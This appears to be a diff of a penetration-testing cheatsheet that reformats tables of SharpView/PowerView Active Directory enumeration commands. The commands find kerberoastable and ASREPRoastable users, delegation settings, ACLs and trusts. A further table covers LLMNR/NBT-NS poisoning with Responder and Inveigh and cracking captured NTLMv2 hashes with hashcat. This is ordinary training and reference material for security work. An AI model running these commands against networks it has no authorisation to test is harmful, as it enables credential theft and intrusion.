@@ -4532,158 +4532,163 @@ dir /b/s "<FILE>"
 
 ### SharpView Cheatsheet 
 
-| Command                                                                                                       | Description                                                   |
-|---------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------|
-| `Get-DomainPolicy`                                                                                           | View the domain password policy                               |
-| `.\SharpView.exe ConvertTo-SID -Name sally.jones`                                                             | Convert a username to a SID                                   |
-| `.\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724`                  | Convert a SID to a username                                   |
-| `Get-DomainUser harry.jones \| ConvertFrom-UACValue -showall`                                                | List all UAC values                                           |
-| `.\SharpView.exe Get-Domain`                                                                                  | View information about the current domain                     |
-| `.\SharpView.exe Get-DomainOU`                                                                                | List all OUs                                                  |
-| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired`                                                 | Find ASREPRoastable users                                     |
-| `Get-DomainComputer`                                                                                          | Get a listing of domain computers                             |
-| `.\SharpView.exe Get-DomainGPO \| findstr displayname`                                                       | List all GPO names                                            |
-| `Get-DomainGPO -ComputerIdentity WS01`                                                                        | List GPOs on a specific host                                  |
-| `Test-AdminAccess -ComputerName SQL01`                                                                        | Test local admin access on a remote host                      |
-| `.\SharpView.exe Get-NetShare -ComputerName SQL01`                                                            | Enumerate open shares on a remote computer                    |
-| `Find-DomainUserLocation`                                                                                     | Find machines where domain users are logged in                |
-| `Get-DomainTrust`                                                                                             | View a list of domain trusts                                  |
-| `(Get-DomainUser).count`                                                                                      | Count all domain users                                        |
-| `.\SharpView.exe Get-DomainUser -Help`                                                                        | Get help about a SharpView function                           |
-| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}`                  | Find non-blank user description fields                        |
-| `.\SharpView.exe Get-DomainUser -SPN`                                                                         | Find users with SPNs set                                      |
-| `Find-ForeignGroup`                                                                                           | Find foreign domain users                                     |
-| `Get-DomainGroup -Properties Name`                                                                            | List domain groups                                            |
-| `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'`                                                | Get members of a domain group                                 |
-| `.\SharpView.exe Get-DomainGroup -AdminCount`                                                                 | List protected groups                                         |
-| `.\SharpView.exe Find-ManagedSecurityGroups`                                                                  | List managed security groups                                  |
-| `Get-NetLocalGroup -ComputerName WS01`                                                                        | Get local groups on a host                                    |
-| `.\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01`                                                 | Get members of a local group                                  |
-| `.\SharpView.exe Get-DomainComputer -Unconstrained`                                                           | Find computers that allow unconstrained delegation            |
-| `Get-DomainComputer -TrustedToAuth`                                                                           | Find computers set with constrained delegation                |
-| `Get-DomainObjectAcl -Identity harry.jones`                                                                   | Enumerate ACLs on a user                                      |
-| `Find-InterestingDomainAcl`                                                                                   | Find objects with modification rights over non built-in objects |
-| `Get-PathAcl "\\SQL01\DB_backups"`                                                                            | Find the ACLs set on a directory                              |
-| `gpresult /r /S WS01`                                                                                         | Get a report of all GPOs applied to a host                    |
-| `Get-DomainGPO \| Get-ObjectAcl`                                                                              | Find GPO permissions                                          |
-| `Get-DomainTrustMapping`                                                                                      | Enumerate trusts for our domain/reachable domains             |
+ | Command | Description |
+|--------|-------------|
+| `Get-DomainPolicy` | View the domain password policy |
+| `.\SharpView.exe ConvertTo-SID -Name sally.jones` | Convert a username to a SID |
+| `.\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724` | Convert a SID to a username |
+| `Get-DomainUser harry.jones \| ConvertFrom-UACValue -showall` | List all UAC values |
+| `.\SharpView.exe Get-Domain` | View information about the current domain |
+| `.\SharpView.exe Get-DomainOU` | List all OUs |
+| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired` | Find ASREPRoastable users |
+| `Get-DomainComputer` | Get a listing of domain computers |
+| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | List all GPO names |
+| `Get-DomainGPO -ComputerIdentity WS01` | List GPOs on a specific host |
+| `Test-AdminAccess -ComputerName SQL01` | Test local admin access on a remote host |
+| `.\SharpView.exe Get-NetShare -ComputerName SQL01` | Enumerate open shares on a remote computer |
+| `Find-DomainUserLocation` | Find machines where domain users are logged in |
+| `Get-DomainTrust` | View a list of domain trusts |
+| `(Get-DomainUser).count` | Count all domain users |
+| `.\SharpView.exe Get-DomainUser -Help` | Get help about a SharpView function |
+| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Find non-blank user description fields |
+| `.\SharpView.exe Get-DomainUser -SPN` | Find users with SPNs set |
+| `Find-ForeignGroup` | Find foreign domain users |
+| `Get-DomainGroup -Properties Name` | List domain groups |
+| `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'` | Get members of a domain group |
+| `.\SharpView.exe Get-DomainGroup -AdminCount` | List protected groups |
+| `.\SharpView.exe Find-ManagedSecurityGroups` | List managed security groups |
+| `Get-NetLocalGroup -ComputerName WS01` | Get local groups on a host |
+| `.\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01` | Get members of a local group |
+| `.\SharpView.exe Get-DomainComputer -Unconstrained` | Find computers that allow unconstrained delegation |
+| `Get-DomainComputer -TrustedToAuth` | Find computers set with constrained delegation |
+| `Get-DomainObjectAcl -Identity harry.jones` | Enumerate ACLs on a user |
+| `Find-InterestingDomainAcl` | Find objects in the domain with modification rights over non built-in objects |
+| `Get-PathAcl "\\SQL01\DB_backups"` | Find the ACLs set on a directory |
+| `gpresult /r /S WS01` | Get a report of all GPOs applied to a host |
+| `Get-DomainGPO \| Get-ObjectAcl` | Find GPO permissions |
+| `Get-DomainTrustMapping` | Enumerate trusts for our domain/reachable domains |
 
 
-#### Sharpview Domain/LDAP Functions 
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Get-DomainDNSZone`                | Enumerates the Active Directory DNS zones for a given domain                                      |
-| `Get-DomainDNSRecord`              | Enumerates the Active Directory DNS records for a given zone                                      |
-| `Get-Domain`                       | Returns the domain object for the current (or specified) domain                                   |
-| `Get-DomainController`             | Returns the domain controllers for the current (or specified) domain                              |
-| `Get-Forest`                       | Returns the forest object for the current (or specified) forest                                   |
-| `Get-ForestDomain`                 | Returns all domains for the current (or specified) forest                                         |
-| `Get-ForestGlobalCatalog`          | Returns all global catalogs for the current (or specified) forest                                 |
-| `Find-DomainObjectPropertyOutlier` | Finds user/group/computer objects in AD that have 'outlier' properties set                        |
-| `Get-DomainUser`                   | Returns all users or specific user objects in AD                                                  |
-| `(Get-DomainUser).count`           | Return count of how many users are in target domain                                               |
+#### SharpView Domain/LDAP Functions
+
+| Command | Description |
+|--------|-------------|
+| `Get-DomainDNSZone` | Enumerates the Active Directory DNS zones for a given domain |
+| `Get-DomainDNSRecord` | Enumerates the Active Directory DNS records for a given zone |
+| `Get-Domain` | Returns the domain object for the current (or specified) domain |
+| `Get-DomainController` | Returns the domain controllers for the current (or specified) domain |
+| `Get-Forest` | Returns the forest object for the current (or specified) forest |
+| `Get-ForestDomain` | Returns all domains for the current (or specified) forest |
+| `Get-ForestGlobalCatalog` | Returns all global catalogs for the current (or specified) forest |
+| `Find-DomainObjectPropertyOutlier` | Finds user/group/computer objects in AD that have 'outlier' properties set |
+| `Get-DomainUser` | Returns all users or specific user objects in AD |
+| `(Get-DomainUser).count` | Return count of how many users are in target domain |
 | `Get-DomainUser * -Domain DOMAIN \| Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol \| Export-Csv .\DOMAIN_users.csv -NoTypeInformation` | Enumerate all domain users and export to CSV |
 | `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof` | Obtain list of all users that do not require Kerberos pre-auth for ASREPRoast attack potential |
-| `.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof`| Get Kerberos constrained delegation users|
-| `.\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"`| Get users that allow unconstrained delegration|
-| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Get users where description isn't blank  | 
+| `.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof` | Get Kerberos constrained delegation users |
+| `.\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` | Get users that allow unconstrained delegation |
+| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Get users where description isn't blank |
 | `.\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname` | Get Service Principal Names (SPNs) which could be subjected to kerberoasting |
-| `Find-ForeignGroup `| Enumerate any users from other (foreign) domains with group membership within any groups in our current domain. Credentials for this user can be obtained from the NTDS database and used to authenticate to the foreign domain |
-| `New-DomainUser`                   | Creates a new domain user (assuming appropriate permissions) and returns the user object          |
-| `Set-DomainUserPassword`           | Sets the password for a given user identity and returns the user object                           |
-| `Get-DomainUserEvent`              | Enumerates account logon events (ID 4624) and logon with explicit credential events               |
-| `Get-DomainComputer`               | Returns all computers or specific computer objects in AD                                          |
-| `Get-DomainObject`                 | Returns all (or specified) domain objects in AD                                                   |
-| `Set-DomainObject`                 | Modifies a given property for a specified Active Directory object                                 |
-| `Get-DomainObjectAcl`              | Returns the ACLs associated with a specific Active Directory object                               |
-| `Add-DomainObjectAcl`              | Adds an ACL for a specific Active Directory object                                                |
-| `Find-InterestingDomainAcl`        | Finds object ACLs in the current (or specified) domain with modification rights to non-built-ins  |
-| `Get-DomainOU`                     | Searches for all organizational units (OUs) or specific OU objects in AD                          |
-| `.\SharpView.exe Get-DomainOU \| findstr /b "name"`| Return name of all OU's based on name field                                       | 
-| `Get-DomainSite`                   | Searches for all sites or specific site objects in AD                                             |
-| `Get-DomainSubnet`                 | Searches for all subnets or specific subnet objects in AD                                         |
-| `Get-DomainSID`                    | Returns the SID for the current domain or the specified domain                                    |
-| `Get-DomainGroup`                  | Returns all groups or specific group objects in AD                                                |
-| `New-DomainGroup`                  | Creates a new domain group (assuming appropriate permissions) and returns the group object        |
-| `Get-DomainManagedSecurityGroup`   | Returns all security groups in the current (or target) domain that have a manager set             |
-| `Get-DomainGroupMember`            | Returns the members of a specific domain group                                                    |
-| `Add-DomainGroupMember`            | Adds a domain user (or group) to an existing domain group, assuming appropriate permissions       |
-| `Get-DomainFileServer`             | Returns a list of servers likely functioning as file servers                                      |
-| `Get-DomainDFSShare`              | Returns a list of all fault-tolerant distributed file systems for the current (or specified) domain |
+| `Find-ForeignGroup` | Enumerate any users from other (foreign) domains with group membership within our domain |
+| `New-DomainUser` | Creates a new domain user (if permissions allow) and returns the user object |
+| `Set-DomainUserPassword` | Sets the password for a given user identity |
+| `Get-DomainUserEvent` | Enumerates account logon events (4624) and logon with explicit credential events |
+| `Get-DomainComputer` | Returns all computers or specific computer objects in AD |
+| `Get-DomainObject` | Returns all (or specified) domain objects in AD |
+| `Set-DomainObject` | Modifies a given property for a specified AD object |
+| `Get-DomainObjectAcl` | Returns the ACLs associated with a specific AD object |
+| `Add-DomainObjectAcl` | Adds an ACL for a specific AD object |
+| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights to non-built-ins |
+| `Get-DomainOU` | Searches for all or specific organizational units (OUs) in AD |
+| `.\SharpView.exe Get-DomainOU \| findstr /b "name"` | Return name of all OUs by name field |
+| `Get-DomainSite` | Searches for all sites or specific site objects in AD |
+| `Get-DomainSubnet` | Searches for all subnets or specific subnet objects in AD |
+| `Get-DomainSID` | Returns the SID for the current or specified domain |
+| `Get-DomainGroup` | Returns all groups or specific group objects in AD |
+| `New-DomainGroup` | Creates a new domain group (if permissions allow) |
+| `Get-DomainManagedSecurityGroup` | Returns all security groups in domain with a manager set |
+| `Get-DomainGroupMember` | Returns the members of a domain group |
+| `Add-DomainGroupMember` | Adds a user or group to an existing domain group |
+| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
+| `Get-DomainDFSShare` | Returns all DFS shares for the domain |
 
-#### Sharpview GPO Functions 
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Get-DomainGPO`                         | Returns all GPOs or specific GPO objects in AD                                                                                        |
-| `.\SharpView.exe Get-DomainGPO \| findstr displayname`| Return all GPO object displaynames |
+#### SharpView GPO Functions
+
+| Command | Description |
+|--------|-------------|
+| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD |
+| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | Return all GPO displaynames |
 | `Get-DomainGPO -ComputerIdentity WS01 \| select displayname` | Find GPO assigned to specific host |
-| `Get-DomainGPOLocalGroup`               | Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups' or Group Policy preferences             |
-| `Get-DomainGPOUserLocalGroupMapping`    | Enumerates the machines where a specific domain user/group is a member of a specific local group, all through GPO correlation        |
-| `Get-DomainGPOComputerLocalGroupMapping`| Takes a computer (or GPO) object and determines what users/groups are in the specified local group for the machine via GPO correlation |
-| `Get-DomainPolicy`                      | Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller     |
+| `Get-DomainGPOLocalGroup` | Lists GPOs that modify local group memberships |
+| `Get-DomainGPOUserLocalGroupMapping` | Maps users/groups to local groups via GPO correlation |
+| `Get-DomainGPOComputerLocalGroupMapping` | Maps computers to local group memberships via GPO correlation |
+| `Get-DomainPolicy` | Returns the default or domain controller policy |
 
 #### Sharpview Computer Enumeration 
 
 The computer enumeration functions can gather information about user sessions, test for local admin access, search for file shares and interesting files. 
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Get-NetLocalGroup`                | Enumerates the local groups on the local (or remote) machine                                                 |
-| `Get-NetLocalGroupMember`          | Enumerates members of a specific local group on the local (or remote) machine                                |
-| `.\SharpView.exe Get-NetShare -ComputerName DC01` | Enumerate open shares on remote machine |
-| `Get-NetShare`                     | Returns open shares on the local (or a remote) machine                                                       |
-| `Get-NetLoggedon`                  | Returns users logged on the local (or a remote) machine                                                      |
-| `Get-NetSession`                   | Returns session information for the local (or a remote) machine                                              |
-| `Get-RegLoggedOn`                  | Returns who is logged onto the local (or a remote) machine via enumeration of remote registry keys           |
-| `Get-NetRDPSession`                | Returns remote desktop/session information for the local (or a remote) machine                               |
-| `Test-AdminAccess`                 | Tests if the current user has administrative access to the local (or a remote) machine                       |
-| ` Test-AdminAccess -ComputerName SQL01`| Test if current user has local admin access on remote machine |
-| `Get-NetComputerSiteName`          | Returns the AD site where the local (or a remote) machine resides                                            |
-| `Get-WMIRegProxy`                  | Enumerates the proxy server and WPAD contents for the current user                                           |
-| `Get-WMIRegLastLoggedOn`           | Returns the last user who logged onto the local (or a remote) machine                                        |
-| `Get-WMIRegCachedRDPConnection`    | Returns information about RDP connections outgoing from the local (or remote) machine                        |
-| `Get-WMIRegMountedDrive`           | Returns information about saved network mounted drives for the local (or remote) machine                     |
-| `Get-WMIProcess`                   | Returns a list of processes and their owners on the local or remote machine                                  |
-| `Find-InterestingFile`            | Searches for files on the given path that match a series of specified criteria                               |
 
-#### Sharpview Domain Meta functions  
+| Command | Description |
+|--------|-------------|
+| `Get-NetLocalGroup` | Lists local groups on the local/remote machine |
+| `Get-NetLocalGroupMember` | Lists members of a local group |
+| `.\SharpView.exe Get-NetShare -ComputerName DC01` | Enumerate open shares on remote machine |
+| `Get-NetShare` | Lists open shares on the local/remote machine |
+| `Get-NetLoggedon` | Lists users logged on the local/remote machine |
+| `Get-NetSession` | Lists sessions on the local/remote machine |
+| `Get-RegLoggedOn` | Enumerates logged-on users via remote registry |
+| `Get-NetRDPSession` | Gets RDP/session info from the local/remote machine |
+| `Test-AdminAccess` | Tests local admin access on local/remote machine |
+| `Test-AdminAccess -ComputerName SQL01` | Tests local admin access on remote machine |
+| `Get-NetComputerSiteName` | Gets the AD site of a computer |
+| `Get-WMIRegProxy` | Gets proxy settings and WPAD config |
+| `Get-WMIRegLastLoggedOn` | Gets the last logged on user |
+| `Get-WMIRegCachedRDPConnection` | Gets cached RDP connection info |
+| `Get-WMIRegMountedDrive` | Gets mounted network drives |
+| `Get-WMIProcess` | Lists running processes and owners |
+| `Find-InterestingFile` | Searches for files matching specific criteria |
+
+#### SharpView Domain Meta Functions
 
 The 'meta' functions can be used to find where domain users are logged in, look for specific processes on remote hosts, find domain shares, find files on domain shares, and test where our current user has local admin rights.
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Find-DomainUserLocation`           | Finds domain machines where specific users are logged into                                       |
-| `Find-DomainProcess`                | Finds domain machines where specific processes are currently running                             |
-| `Find-DomainUserEvent`              | Finds logon events on the current (or remote) domain for specified users                         |
-| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                        |
-| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain                   |
-| `Find-LocalAdminAccess`             | Finds machines in the domain where the current user has local administrator access               |
-| `Find-DomainLocalGroupMember`       | Enumerates the members of specified local group on machines in the domain                        |
+| Command | Description |
+|--------|-------------|
+| `Find-DomainUserLocation` | Finds where specific domain users are logged in |
+| `Find-DomainProcess` | Finds machines where specific processes are running |
+| `Find-DomainUserEvent` | Finds logon events for specific users |
+| `Find-DomainShare` | Finds reachable shares on domain machines |
+| `Find-InterestingDomainShareFile` | Searches shares for interesting files |
+| `Find-LocalAdminAccess` | Finds machines where user has local admin rights |
+| `Find-DomainLocalGroupMember` | Enumerates members of local groups on domain machines |
+
 
 #### Sharpview Trusts & Inter-Domain Enumeration 
 
 The domain trust functions provide us with the tools we need to enumerate information that can be used to mount cross-trust attacks. 
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Get-DomainTrust`                | Returns all domain trusts for the current or specified domain                                   |
-| `Get-ForestTrust`                | Returns all forest trusts for the current or specified forest                                   |
-| `Get-DomainForeignUser`          | Enumerates users who are in groups outside of the user's domain                                 |
-| `Get-DomainForeignGroupMember`   | Enumerates groups with users outside of the group's domain and returns each foreign member      |
-| `Get-DomainTrustMapping`         | Enumerates all trusts for the current domain and recursively enumerates trusts for each domain  |
+| Command | Description |
+|--------|-------------|
+| `Get-DomainTrust` | Returns all domain trusts |
+| `Get-ForestTrust` | Returns all forest trusts |
+| `Get-DomainForeignUser` | Lists foreign users in local groups |
+| `Get-DomainForeignGroupMember` | Lists foreign group members |
+| `Get-DomainTrustMapping` | Recursively enumerates reachable domain trusts |
+
 ### LLMNR/NTB-NS Poisoning 
 
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
-| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
-| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
-| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
-| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
-| `.\Inveigh.exe`                                              | Starts the `C##` implementation of `Inveigh` from a Windows-based host. |
-| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach {Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |
+| Command | Description |
+|--------|-------------|
+| `responder -h` | Shows options for Responder (Linux) |
+| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Cracks NTLMv2 hashes using Hashcat |
+| `Import-Module .\Inveigh.ps1` | Imports Inveigh PowerShell module |
+| `(Get-Command Invoke-Inveigh).Parameters` | Lists available parameters for Invoke-Inveigh |
+| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Starts Inveigh with LLMNR & NBNS spoofing |
+| `.\Inveigh.exe` | Starts C# implementation of Inveigh |
+| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \| foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }` | Disables NetBIOS over TCP/IP |
 
 ### Password Spraying & Password Policies
 
